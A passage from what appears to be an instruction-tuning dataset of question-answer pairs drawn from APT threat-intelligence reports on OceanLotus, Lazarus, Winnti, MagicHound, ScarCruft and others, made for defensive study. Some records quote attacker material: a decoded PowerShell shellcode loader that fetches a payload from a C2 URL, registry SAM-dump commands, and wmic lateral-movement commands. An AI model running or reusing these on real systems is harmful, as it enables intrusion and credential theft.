hassle of creating a new tool, it is much harder to attribute a tool that can be used by anyone rather than a custom-made tool. However, the attackers should not be considered script-kiddies. Most of the publicly available tools were either obfuscated, modified and even merged with other tools to evade antivirus detection. This type of customization requires good coding skills and understanding of how those tools work.\n\u25cf Cobalt Strike usage in APT - is a commercial offensive security framework designed to simulate complex attacks and is mainly used by security professionals in security audits and penetration testing. The OceanLotus Group using as one of its main tools. Other Large scale APTs using Cobalt Strike have been reported before, such as (could be related to OceanLotus), , , and the .\n\u25cf Custom-built backdoors - The threat actor used very sophisticated and stealthy backdoors (Denis & Goopy) that were written by highly skilled malware authors. During the attack, the authors introduced new variants of these backdoors, indicating \"on-the-fly\" development capabilities. Developing such state-of-the-art backdoors requires skillful malware authors, time and resources. In addition, both the Denis and Goopy backdoors used DNS Tunneling for C2 communication. The OceanLotus Group is known to have a backdoor that use this stealthy technique. However, no public analysis reports of SOUNDBITE is available to the time of writing this report.\n\u25cf Exploiting DLL hijacking in trusted applications - The attackers exploited three DLL-hijacking vulnerabilities in legitimate applications from trusted vendors: Microsoft, Google and Kaspersky. This further indicates the group's emphasis on vulnerability research. DLL-hijacking / Side-loading attacks are not uncommon in APTs, some of which are also carried out by nation-state actors and advanced cyber-crime groups.\nThere have been reports in the past of by as well as the exploiting Microsoft and Kaspersky applications in .\n\u25cf Insisting on fileless operation - While fileless delivery infrastructure is not a feature that can be attributed to one specific group, it is still worth mentioning since the attackers went out of their way to restore the script-based PowerShell / Visual Basic operation, especially after PowerShell execution had been disabled in the entire organization.\n\u25cf C&C infrastructure\n\u25cb Divide and conquer - Each tool communicated with different sets of C&C servers domains, which usually came in triads. For instance, Cobalt strike payloads communicated with certain sets of IPs/domains while the backdoors communicated with different sets of IPs/domains.\n\u25cb Re-use of domains and IPs across campaigns - Quite a few domains and IPs that were observed in Operation Cobalt Kitty were found in-the-wild, attacking other targets. It's rather peculiar why the threat actor re-used the same domains and IPs. It could be assumed that the malware operators wanted to have centralized C&C servers per tool or tools, where they could monitor all of their campaigns from dedicated servers.\n\u25cb Anonymous DNS records - Most of the domains point to companies that provide DNS data privacy and anonymization, such as and .\n\u25cb C&C server protection - Most of the C&C servers IP addresses are protected by and .\nMedium Headline: OceanLotus Group activity in Asia\nAs part of the analysis of the domains and IPs that were used in this operation, Cybereason found samples that were caught \"in-the-wild\" (that were not part of Operation Cobalt Kitty). Analysis of those samples clearly indicates the involvement of the threat actor in Asia and Vietnam in particular. Both Qihoo 360 and FireEye demonstrate in their reports that the threat actor is involved in campaigns in different Asian countries, such as Vietnam, China, and the Philippines.\nMost of the samples caught in-the-wild seem to target Vietnamese speakers. Some of the samples exhibit clear evidence of targeting Vietnamese entities. This conclusion is derived from the file names and file contents that are written in Vietnamese, as shown in the examples below:\nFile Name: \u0110i\u1ec7n tho\u1ea1i b\u1ecb ch\u00e1y.doc\nSHA-1: 38297392df481d2ecf00cc7f05ce3361bd575b04\nMalicious Domain / IP: 193.169.245(.)137\nFile Name: ID2016.doc\nSHA-1: bfb3ca77d95d4f34982509380f2f146f63aa41bc\nMalicious Domain / IP: support.chatconnecting(.)com\nFile Name: Gi\u1ea5y y\u00eau c\u1ea7u b\u1ed3i th\u01b0\u1eddng m\u1edbi 2016 - H\u1eb1ng.doc (Translation: \"New Claim Form 2016\")\nSHA-1: A5bddb5b10d673cbfe9b16a062ac78c9aa75b61c\nMalicious Domain / IP: blog.versign(.)info\nMedium Headline: Appendix B: Denis Backdoor samples in the wild\n\u00a92017 Cybereason Inc. All rights reserved.\nCybereason is the leader in endpoint protection, offering endpoint detection and response, next-generation antivirus, and active monitoring services. Founded by elite intelligence professionals born and bred in offense-first hunting, Cybereason gives enterprises the upper hand over cyber adversaries. The Cybereason platform is powered by a custom-built in-memory graph, the only truly automated hunting engine anywhere. It detects behavioral patterns across every endpoint and surfaces malicious operations in an exceptionally user-friendly interface. Cybereason is privately held and headquartered in Boston with offices in London, Tel Aviv, and Tokyo.\n\nHow did the OceanLotus Group leverage the Outlook backdoor in Operation Cobalt Kitty, and why is this tool significant in profiling the threat actor?",
    "output": "The OceanLotus Group introduced an Outlook backdoor that used Outlook as a command and control (C2) channel. This backdoor is notable because it has not been publicly documented and is considered one of the 'signature tools' of the OceanLotus Group. While Outlook backdoors are not new, this specific implementation is unique to the group. This tool is significant because it highlights the group's innovative approach to C2 communication and their ability to develop sophisticated and stealthy techniques to evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Code Red and Code Red II worms operate, and what was their impact on the internet and affected systems?",
    "output": "The Code Red and Code Red II worms targeted computers running Microsoft's IIS web server and exploited a buffer overflow. They caused nearly $2 billion in damages and infected over 600,000 computers. The worms slowed down internet speeds, knocked websites and networks offline, and defaced websites with the phrase 'Hacked by Chinese!'. Code Red II had a payload that could open a backdoor, leaving computers vulnerable to further exploitation. These worms coincided with the Hainan or EP-3 Incident, leading to patriotic defacements and counterattacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the GhostNet APT demonstrate the significance of reconnaissance in cyberspace?",
    "output": "Reconnaissance is a crucial phase in the adversary lifecycle where attackers gather information to plan future operations. In the case of the GhostNet APT, reconnaissance played a vital role in its success. According to the report, the GhostNet system was able to infiltrate numerous high-profile targets, demonstrating the strategic significance of reconnaissance in cyberspace. The attackers were able to gather sensitive information, including documents and communications, which could be used to support future operations. Furthermore, the report highlights the importance of 'active reconnaissance, surveillance, and exploitation' in the subterranean layers of cyberspace, indicating that reconnaissance is an ongoing process that requires continuous monitoring and analysis. The GhostNet APT's capabilities of exploitation and strategic intelligence harvesting also underscore the importance of reconnaissance in identifying vulnerabilities and prioritizing post-compromise objectives. Overall, the GhostNet APT demonstrates the significance of reconnaissance in cyberspace, highlighting the need for organizations to prioritize information security and be aware of the potential threats lurking in the shadows.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: MAGICHOUND.FETCH\nThe custom loader Trojan used by this group, which we call MagicHound.Fetch is responsible for setting up persistent access to the system and to reach out to a remote server to download and execute a secondary payload. To set up persistence, the loader creates a folder named \"c:\\temp\", sets its attributes to be a hidden and system folder to hide the folder from view in Windows Explorer. It then writes a file named \"rr.exe\" (SHA256: f439dee4210d623b5aa7491bad8e8d9b43305f25a5d26940eb36f6460215cf8e) to this folder and executes it with specific command line arguments. During our analysis, we observed one loader running \"rr.exe\" with the following arguments:\nMedium Headline: 1 open cmd.exe /c c:\\\\temp\\\\rr.exe SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run \"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\spp.exe\" iexplore\nThe \"rr.exe\" payload dropped to the system does nothing more than use the supplied command line arguments to create a registry key to execute the payload each time the system starts. In the example above, the \"spp.exe\" executable would be added to an auto-run registry key at:\nSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\iexplore\nMany of the Fetch samples attempted to obfuscate their functionality by encrypting their embedded strings with AES using the same key \"agkrhfpdbvhdhrkj\"; however, the loader's main goal involved running the following command:\n1 /c powershell -window hidden -EncodedCommand JAAwAG8AOABlACAAPQAgACcAJABmADkAQgAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIA\nThe base64 encoded command decodes to the following:\n1 $0o8e = '$f9B = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $f9B -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = <shellcode REDACTED for brevity>;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rJr=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rJr.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rJr,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($0o8e));$DKn = \"-enc \";if([IntPtr]::Size -eq 8){$b32 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";iex \"& $b32 $DKn $e\"}else{;iex \"& powershell $DKn $e\";}\nThe decoded command above builds a buffer that it uses to store shellcode and creates a thread to execute it. We found the command above within the source code of (<https://github.com/trustedsec/unicorn/blob/master/unicorn.py>)Magic Unicorn, which was also used in the Magic Hound delivery documents. The shellcode executed by this command is the same as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode to execute using an HTTP request to the following URL:\nhttp://www7.chrome-up[.]date/0m5EE\nWe are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to provide a payload. However, as alluded to above, we believe that this adversary used the open source Magic Unicorn tool to load a shellcode-based payload. The fact that the actor used Metasploit shellcode within the Unicorn generated PowerShell script leads us to speculate that the ultimate payload of this attack is Meterpreter, which is a shellcode-based payload.\n\nQuestion: What is the purpose of the base64 encoded PowerShell command used by the MagicHound.Fetch loader, and how does it facilitate the execution of the payload?\n\nAnswer:",
    "output": "The base64 encoded PowerShell command used by the MagicHound.Fetch loader is designed to build a buffer to store shellcode and create a thread to execute it. The decoded command reveals a script that defines several DLL import functions, including VirtualAlloc, CreateThread, and memset, which are used to allocate memory, create a new thread, and copy the shellcode into memory, respectively. The shellcode is then executed by the newly created thread. This command is derived from the Magic Unicorn tool and uses Metasploit shellcode to obtain additional shellcode via an HTTP request to a specified URL. The ultimate payload is likely Meterpreter, a shellcode-based payload commonly used for post-exploitation activities. This method allows the loader to execute arbitrary code without writing it to disk, making it harder to detect using traditional antivirus solutions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Bookcode infection procedure\nAlthough we didn't find the piece of malware tasked with deploying the loader and its encrypted Bookcode payload, we were able to identify a loader sample. This file is responsible for loading an encrypted payload named gmslogmgr.dat located in the system folder. After decrypting the payload, the loader finds the Service Host Process (svchost.exe) with winmgmt, ProfSvc or Appinfo parameters and injects the payload into it. Unfortunately, we couldn't acquire the encrypted payload file, but we were able to reconstruct the malware actions on the victim machine and identify it as the Bookcode malware we reported to our Threat Intelligence Report customers.\nUpon execution, the Bookcode malware reads a configuration file. While previous Bookcode samples used the file perf91nc.inf as a configuration file, this version reads its configuration from a file called C_28705.NLS. This Bookcode sample has almost identical functionality as the malware described in the comprehensive (<https://www.boho.or.kr/krcert/publicationView.do?bulletin_writing_sequence=35799>)report recently published by Korea Internet & Security Agency (KISA). As described on page 57 of that report, once the malware is started it sends information about the victim to the attacker's infrastructure. After communicating with the C2 server, the malware provides standard backdoor functionalities.\nBig Headline: Post-exploitation phase\nThe Lazarus group's campaign using the Bookcode cluster has its own unique TTPs, and the same modus operandi was used in this attack.\nExtracting infected host information, including password hashes, from the registry sam dump.\nUsing Windows commands in order to check network connectivity.\nUsing the  tool to scan hosts in the same network.\nAfter installing Bookcode on September 25, 2020, the malware operator started gathering system and network information from the victim. The malware operator also collected a registry sam dump containing password hashes:\nexe /c \"reg.exe save hklm\\sam %temp%\\~reg_sam.save > \"%temp%\\BD54EA8118AF46.TMP~\" 2>&1\u2033\nexe /c \"reg.exe save hklm\\system %temp%\\~reg_system.save > \"%temp%\\405A758FA9C3DD.TMP~\" 2>&1\u2033\nIn the lateral movement phase, the malware operator used well-known methodologies. After acquiring account information, they connected to another host with the \"net\" command and executed a copied payload with the \"wmic\" command.\nexe /c \"netstat -aon | find \"ESTA\" > %temp%\\~431F.tmp\nexe /c \"net use \\\\172.[redacted] \"[redacted]\" /u:[redacted] > %temp%\\~D94.tmp\" 2>&1\u2033\nwmic /node:172.[redacted] /user:[redacted] /password:\"[redacted]\" process call create \"%temp%\\engtask.exe\" > %temp%\\~9DC9.tmp\" 2>&1\u2033\nMoreover, Lazarus used  in order to collect additional information from the Active Directory. Using this utility, the threat actor extracted a list of the victim's users and computers.\n\nAnswer this question based on the above context: How does the Bookcode malware used by the Lazarus group achieve persistence and execute its payload on the victim's machine? Explain the steps involved in the infection procedure.",
    "output": "The Bookcode malware achieves persistence and executes its payload through several steps. First, a loader sample is responsible for loading an encrypted payload named 'gmslogmgr.dat' located in the system folder. After decrypting the payload, the loader finds the Service Host Process (svchost.exe) with specific parameters (winmgmt, ProfSvc, or Appinfo) and injects the payload into it. Upon execution, the Bookcode malware reads a configuration file called 'C_28705.NLS'. This version of Bookcode has almost identical functionality to previous samples, which used 'perf91nc.inf' as the configuration file. Once started, the malware sends information about the victim to the attacker's infrastructure and provides standard backdoor functionalities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Stuxnet malware utilize rootkit functionality to remain undetected on infected systems?",
    "output": "Rootkits are programs designed to hide the existence of malware by intercepting and modifying operating system API calls that supply system information. In the case of the Stuxnet malware, it employs rootkit functionality to conceal its presence on infected systems. Specifically, Stuxnet uses a Windows rootkit to hide its files, network connections, and other system components. The rootkit intercepts and modifies operating system API calls, making it difficult for system administrators to detect the malware's presence. Furthermore, Stuxnet's rootkit functionality resides at the kernel level, allowing it to manipulate system information and remain undetected. The malware also utilizes a PLC rootkit to hide its code on programmable logic controllers (PLCs), further demonstrating its sophisticated use of rootkit technology. Overall, Stuxnet's use of rootkit functionality enables it to maintain a stealthy presence on infected systems, making it challenging for defenders to detect and mitigate the threat.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: By phone\nFew days later, we were contacted again, this time by phone. The caller pretended to be an official in one of the effected countries mentioned in the report. Similarly, he asked for further information about the identity of the attacker. We asked the caller to send his request via email. Corroborating the provided contact information, we learned that this was also a fake.\nIn both cases, we did not send any information to the attackers. However, we used the new leads to deepen the investigation.\nBelow is the email we received:\n\nAnswer this question based on the above context: How did the authors of the Clearsky Operation DustySky report handle requests for additional information from suspected attackers, and what steps did they take to verify the authenticity of these requests?",
    "output": "The authors of the Clearsky Operation DustySky report handled requests for additional information by asking the requesters to send their requests via email. They then corroborated the provided contact information to verify its authenticity. In both instances where they were contacted\u2014once by email and once by phone\u2014they discovered that the requests were fake. Despite not providing any information to the attackers, they utilized these new leads to deepen their investigation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nIn October 2012, Kaspersky Lab's Global Research & Analysis Team initiated a new threat research after a series of attacks against computer networks of various international diplomatic service agencies. A large scale cyber-espionage network was revealed and analyzed during the investigation, which we called \"Red October\" (after famous novel \"The Hunt For The Red October\").\nThis report is based on detailed technical analysis of a series of targeted attacks against diplomatic, governmental and scientific research organizations in different countries, mostly related to the region of Eastern Europe, former USSR members and countries in Central Asia.\nThe main objective of the attackers was to gather intelligence from the compromised organizations, which included computer systems, personal mobile devices and network equipment.\nThe earliest evidence indicates that the cyber-espionage campaign was active since 2007 and is still active at the time of writing (January 2013). Besides that, registration data used for the purchase of several Command & Control (C&C) servers and unique malware filenames related to the current attackers hints at even earlier time of activity dating back to May 2007.\nRead the text above and answer this question: What were the primary objectives of the 'Red October' cyber-espionage campaign, and how did the attackers achieve these goals?",
    "output": "The primary objective of the 'Red October' cyber-espionage campaign was to gather intelligence from the compromised organizations. This included targeting computer systems, personal mobile devices, and network equipment. The attackers achieved these goals by employing a series of targeted attacks against diplomatic, governmental, and scientific research organizations, primarily in Eastern Europe, former USSR members, and countries in Central Asia. The campaign was active since at least 2007 and continued until January 2013, with some indications suggesting it might have started even earlier, in May 2007. The attackers used sophisticated methods, including the use of Command & Control (C&C) servers and unique malware filenames, to carry out their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: INSTALLATION PHASE 3: ENGINE ACTIVITIES\nThe engine component exists only in memory and is completely dependent on the service component remaining active in order to have a process space in which to operate. The installation functionality for the version 3.0 Winnti malware variants exists within the Install export. When activated, the Install export requires a full filename and path back to the service binary.\n1. The Install function checks if the process responsible for calling the Install function is explorer.exe. If so, the function uses a variant of the sysprep User Account Control (UAC) bypass.2\n2. The current privilege level of the process is verified to be suitable for installing additional binaries. The test consists of determining if the operating system is newer than Windows XP and if the process has administrative privileges. If these conditions are met, the dropper is called again from explorer.exe.\nThe authors went to great pains to ensure that the installation process had a suitable chance of performing its function both undetected (by using a UAC bypass) and with suitable privileges. The use of the sysprep UAC bypass and the verification of process privileges indicate that the authors were at least aware of the changing security environment in later versions of Windows and were adapting to ensure the successful propagation of their tools on a victim's machine.\n3. The configuration information implanted at the end of the service component is extracted and decrypted.\n2 K. Kleissner. \"UAC Bypass for Windows 7 RTM, SP1/ Windows 8 DP, CP all 32-bit for admin with default UAC settings\". http://download.pureftpd. org/pub/misc/UAC.cpp. Accessed 1 December 2014\nThe configuration information for the infection typically exists at the very end of the service configuration. The last DWORD of the file contains an offset from the end of the file to the beginning of the configuration. The structure of the configuration is as follows:\nstruct ScheduleEntry\nstruct Config\n{\nchar szC2[100];    char szCampaignID1[32];    char szCampaignID2[32];    char szCampaignIDNumber[24];\nDWORD unknown0;\nDWORD unknown1;\nDWORD unknown2;\nDWORD dwCommMode;\nDWORD dwProxyType;    char szProxyServer[32];    char szProxyUser[32];    char szProxyPassword[32];\nScheduleEntry arrActivePeriods[7];\nDWORD iReconnectTime;\n};\nThe configuration is encrypted using a rolling XOR with the first byte of the XOR being 0x99. The XOR increments one byte at a time until a wraparound occurs at 0xFF.\n4. The files %SYSDIR%\\wmtsk.dll and %SYSDIR%\\wmm2.dat are checked to ensure that they do not exist and that they are not directories. If either condition is not met, an INI file named %SYSDIR%\\ otfkyt.dat is generated with the UPDATE section containing File={path to service component DLL} and the process terminates.\n5. A global event named Global\\ 5164FDA21542C0EB638BA110F9F3ADAF establishes a poor man's mutex, indicating that the installation process is currently ongoing. To give other processes time to read the event check, a 12-second delay is introduced before continuing the installation process.\n6. The service component is copied from the %TEMP% directory to %SYSDIR%\\wmtsk.dll, and the worker component is copied from the %TEMP% directory to %SYSDIR%\\wmm2.dat.\n7. The timestamps of both wmtsk.dll and wmm2.dat are set to match that of cmd.exe.\n8. The original %TEMP% instances of the worker and service DLLs are deleted.\n9. The configuration is appended to the wmtsk.dll file using the same rolling XOR (starting with the value 0x99).\nThe bulk of the installation of Winnti is now complete. The dropped files are now in the correct location and ready for activation. The final steps of the installation establish the persistence model for the malware and begin the activation of the malware on the victim's system.\n10. A new service entry is manually added to the registry to ensure the malware will activate upon reboot of the victim's machine. The new service is named wind0ws, with a display name of automaticallyssl and the description of Monitoring of hardwares and automatically updates the device drivers.\n11. WinExec is used to call the command net start wind0ws.\n12. The installation completes by returning control to the service component, which terminates quietly.\nThe service that the engine component installs runs under the svchost.exe executable as a netsvc. The engine will directly modify the registry after using the CreateServiceA function to establish the basics of the new service. The use of direct registry modifications to entries under the LOCAL MACHINE (HKLM) hive requires elevated privileges, which may explain why the authors went to such great pains to ensure the installation process occurred in a suitable process space.\nBig Headline: ACTIVATION PHASE 1: SERVICE ACTIVITIES\nActivation of the Winnti malware begins whenever the service component is activated. Typically, activation is the result of the registered service (e.g., wind0ws) being activated by either a reboot of the victim's machine or by the net start command being issued during the final phase of the installation process. In either case, the DllMain function is called prior to the ServiceMainEx function of the service component being called by Windows, thus kicking off the activation of the Winnti version\n3.0 malware.\n1. The DllMain function, upon activation, manually loads the engine binary into memory.\n2. The exports from the engine component (Install, DeleteF, and Workman) are loaded into a memory structure.\n3. The service component determines if the host binary responsible for the service component is either svchost.exe (if run as a service) or rundll32.dll (if loaded pseudo-manually or from the dropper).\n4. If neither host executable is found, the Install function of the engine is activated. Otherwise, the DllMain function returns with a success status.\nWith the initialization of the service component's DLL complete, Windows calls the ServiceMainEx function to activate the service. The ServiceMainEx function, like the DlgProc function, is extremely lightweight in its functionality.\n5. The ServiceMainEx function registers a service handler function to respond to service status control requests from Windows.\n6. The service is set to the Running state.\n7. An unnamed event is created.\n8. The engine's Workmain function is called with both the path to the host executable (the service DLL) and the name of the service supplied as parameters.\n9. A sleep of 3 seconds occurs before the function waits indefinitely for the unnamed event to become set.\nThe ServiceMainEx function does little more than establish a basic scaffold for activating the Workmain function of the engine component. The service remains active, thus providing a process space for the engine, until the unnamed event is set. The unnamed event becomes set only after the service receives the SERVICE_STOP signal from Windows.\nAfter the service component calls the Workmain function of the engine component, the engine component picks up the baton to complete the next phase of the activation sequence.\n\nWhy did the authors of the Winnti malware use a UAC bypass during the installation phase? Explain the significance of this technique in the context of the evolving Windows security environment.",
    "output": "The authors of the Winnti malware used a UAC bypass during the installation phase to ensure that the installation process could perform its function undetected and with suitable privileges. This technique is significant because it demonstrates the authors' awareness of the changing security environment in later versions of Windows. By using a UAC bypass, the malware can bypass user account controls that might otherwise prevent it from installing additional binaries, thereby increasing the likelihood of successful propagation on a victim's machine.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Flash zero-day exploit deployed by the ScarCruft APT Group\nEarlier this year, we deployed new technologies in Kaspersky Lab products to identify and block zero-day attacks. (<https://securelist.com/blog/research/73255/the-mysterious-case-of-cve-2016-0034-the-hunt-for-a-microsoft-silverlight-0-day/>)This technology already proved its effectiveness earlier this year, when it caught an Adobe Flash zero day exploit (CVE-2016-1010). Earlier this month, our technology caught another zero-day Adobe Flash Player exploit deployed in targeted attacks. We believe the attacks are launched by an APT Group we track under the codename \"ScarCruft\".\nScarCruft is a relatively new APT group; victims have been observed in Russia, Nepal, South Korea, China, India, Kuwait and Romania. The group has several ongoing operations, utilizing multiple exploits \u2014 two for Adobe Flash and one for Microsoft Internet Explorer.\nOperation Daybreak appears to have been launched by ScarCruft in March 2016 and employs a previously unknown (0-day) Adobe Flash Player exploit. It is also possible that the group deployed another zero day exploit, CVE-2016-0147, which was patched in April.\nThis exploit caught by our technologies highlights a few very interesting evasion methods, some of which we haven't seen before. We describe them below.\nBig Headline: Vulnerability technical details\nThe vulnerability (CVE-2016-4171) is located in the code which parses the ExecPolicy metadata information.\nThis is what the structure looks like:\nThis structure also contains an array of item_info structures:\nThe documentation says the following about these structures:\n\"The item_info entry consists of item_count elements that are interpreted as key/value pairs of indices into the string table of the constant pool. If the value of key is zero, this is a keyless entry and only carries a value.\"\nIn the exploit used by the ScarCruft group, we have the following item_info structures:\nMedium Headline: Item_info array in exploit object\nThe code that triggers the vulnerability parses this structure and, for every key and value members, tries to get the respective string object from string constant pool. The problem relies on the fact that the \".key\" and \".value\" members are used as indexes without any kind of boundary checks. It is easy to understand that if key or value members are larger than string constant pool array, a memory corruption problem appears. It is also important to mention that this member's (value, key) are directly read from SWF object, so an attacker can easily use them to implement arbitrary read/write operations.\nMedium Headline: Second stage DLL internal name and export\nThe code of this module is loaded directly into the exploited application and has several methods of payload execution. One of method uses a very interesting technique of payload execution which is designed mostly to bypass modern anti-malware products. This uses an interesting bug in the Windows DDE component. It is not a secret that anti-malware systems trigger on special system functions that are called in the context of potential vulnerable applications to make a deeper analysis of API calls such as CreateProcess, WinExec or ShellExecute.\nFor instance, such defense technologies trigger if a potentially vulnerable application such as Adobe Flash starts other untrusted applications, scripts interpreters or even the command console.\nTo make execution of payload invisible for these defense systems, the threat actors used the Windows DDE interface in a very clever way. First, they register a special window for it:\nIn the window procedure, they post WM_DDE_EXECUTE messages with commands:\nMedium Headline: Malicious VBS used in the attack\nWe have reported this \"creative\" abuse of DDE to Microsoft's security team.\nThe final payload of the attack is a CAB file with the following MD5:\n8844a537e7f533192ca8e81886e70fbc\nThe MS CAB file (md5: 8844a537e7f533192ca8e81886e70fbc) contains 4 malicious DLL files:\nMD5\nFilename\nThe file cldbct.dll (e51ce28c2e2d226365bc5315d3e5f83e) connects to the following C2:\nhXXp://webconncheck.myfw[.]us:8080/8xrss.php\nThe modules are signed by an invalid digital certificates listed as \"Tencent Technology (Shenzhen) Company Limited\" with serial numbers, copied from real Tencent certificates:\n5d 06 88 f9 04 0a d5 22 87 fc 32 ad ec eb 85 b0\n71 70 bd 93 cf 3f 18 9a e6 45 2b 51 4c 49 34 0e\nBig Headline: Conclusions:\nNowadays, in-the-wild Flash Player exploits are becoming rare. This is because in most cases they need to be coupled with a Sandbox bypass exploit, which makes them rather tricky.\nAdditionally, Adobe has been doing a great job at implementing new mitigations to make exploitation of Flash Player more and more difficult.\nNevertheless, resourceful threat actors such as ScarCruft will probably continue to deploy zero-day exploits against their high profile targets.\nAs usual, the best defense against targeted attacks is a multi-layered approach. Windows users should combine traditional anti-malware technologies with patch management, host intrusion detection and, ideally, whitelisting and\nKaspersky products detect flash exploit as HEUR:Exploit.SWF.Agent.gen also our AEP (Automatic Exploit Prevention) component can successfully detect this attack. Payloads are detected with HEUR:Trojan.Win32.ScarCruft.gen verdict.\n* More information about the ScarCruft APT group is available to customers of (<http://www.kaspersky.com/business-security/entrp/apt>)Kaspersky Intelligent Services.\n\nBased on the above text, answer a question. Why are in-the-wild Flash Player exploits becoming rare, and how does the ScarCruft APT group manage to deploy zero-day exploits despite these challenges?",
    "output": "In-the-wild Flash Player exploits are becoming rare because they often require coupling with a sandbox bypass exploit, making them complex to execute. Additionally, Adobe has implemented new mitigations to make Flash Player exploitation more difficult. However, resourceful threat actors like the ScarCruft APT group continue to deploy zero-day exploits against high-profile targets by leveraging advanced techniques and evasion methods, such as those described in the exploitation of CVE-2016-4171.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "CrowdStrike Services - CrowdStrike Intelligence\nJanuary 27, 2022\nStellarParticle is a campaign tracked by CrowdStrike as related to the SUNSPOT implant from the SolarWinds intrusion in December 2020 and associated with COZY BEAR (aka APT29, \"The Dukes\").\nThe StellarParticle campaign has continued against multiple organizations, with COZY BEAR using novel tools and techniques to complete their objectives, as identified by CrowdStrike incident responders and the CrowdStrike Intelligence team.\nBrowser cookie theft and Microsoft Service Principal manipulation are two of the novel techniques and tools leveraged in the StellarParticle campaign and are discussed in this blog.\nTwo sophisticated malware families were placed on victim systems in mid-2019: a Linux variant of GoldMax and a new implant dubbed TrailBlazer.\nSupply chain compromises are an increasing threat that impacts a range of sectors, with threat actors leveraging access to support several motivations including financial gain (such as with the Kaseya ransomware attack) and (<https://www.crowdstrike.com/cybersecurity-101/cyberattacks/cyber-espionage/>)espionage. Throughout 2020, an operation attributed to the Foreign Intelligence Service of the Russian Federation (SVR) by the U.S. government was conducted to gain access to the update mechanism of the SolarWinds IT management software\nand use it to broaden their intelligence collection capabilities. This activity is tracked by CrowdStrike as the StellarParticle campaign and is associated with the  adversary group.\nThis blog discusses the novel tactics and techniques leveraged in StellarParticle investigations conducted by CrowdStrike. These techniques include:\nCredential hopping for obscuring lateral movement\nOffice 365 (O365) Service Principal and Application hijacking, impersonation and manipulation\nStealing browser cookies for bypassing multifactor authentication\nUse of the TrailBlazer implant and the Linux variant of GoldMax malware\nCredential theft using Get-ADReplAccount\n\nQ: In the StellarParticle campaign, how did COZY BEAR (APT29) leverage browser cookie theft to bypass multifactor authentication, and what implications does this have for cybersecurity professionals?",
    "output": "A: COZY BEAR (APT29) leveraged browser cookie theft as one of the novel techniques in the StellarParticle campaign to bypass multifactor authentication. By stealing browser cookies, the adversaries could gain unauthorized access to user accounts without needing to enter the second factor of authentication. This technique highlights the importance for cybersecurity professionals to implement additional layers of security beyond just multifactor authentication, such as monitoring for unusual login activities and securing browser sessions. Additionally, it underscores the need for regular security audits and the use of advanced threat detection mechanisms to identify and mitigate such sophisticated attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ATTACK VECTOR\nAttempted delivery of the malware was via email attachment, employing social engineering techniques. The emails that contained the attached IEXPL0RE RAT were different every time, with a unique email and delivery method used for each attempt, including multiple versions targeted at the same organization. Each email was tailored specifically for the target, both in terms of subject, content, and the way the RAT was attached and hidden.\nOrganization 1: a human rights NGO received multiple emails with interesting keywords from senders claiming to be from personal friends. These emails included an executable attachment in a password-protected archive, which helps prevent detection by antivirus software. The password was included in the email address.\nOrganization 2: a news organization operating a website that reports on developments in China, received an email containing a story about a high-rise apartment building fire. Attached to the email were four images and two executable files (.scr extensions) designed to look like images using the Unicode right-to-left override character. When each executable file is run, it will install and launch the malware, drop an image, open the image, and delete itself. The end result is that only an image is left, making the email look more legitimate if the malware is run (figure 1).\nMedium Headline: FIGURE 1: IMAGE OF A HIGH-RISE FIRE USED TO TRICK RECIPIENTS INTO RUNNING THE MALWARE.\nOrganization 3: a Tibet-related organization received two emails with different versions of the malware attached. The first file was an executable file designed to appear as a video of a speech by the Dalai Lama, attached to an email about a year review of Tibetan human rights issues (figure 2). The second file was embedded in an Excel spreadsheet attached to an email pretending to be from a conference on climate change.\nEmails that contain malicious attachments use a variety of social engineering techniques to appear more legitimate. Methods include using names of real people and organizations, choosing material that is directly related to the target's interests, and including chains of fake forwards to make it appear as if the email has been circulated.\nIncluding the attachments in a RAR file makes them less likely to be discovered by an antivirus (AV) scanner. Putting a password on the archive and including it in the email reduces the chances of AV discovery even further.\nMedium Headline: FIGURE 2: EXAMPLE TARGETED EMAIL WITH IEXPL0RE RAT USING SOCIAL ENGINEERING METHODS.\nA newer version of the RAT payload was later distributed via email in multiple RTF documents to organization 3. The RTF dropped a DLL alongside a legitimate program vulnerable to 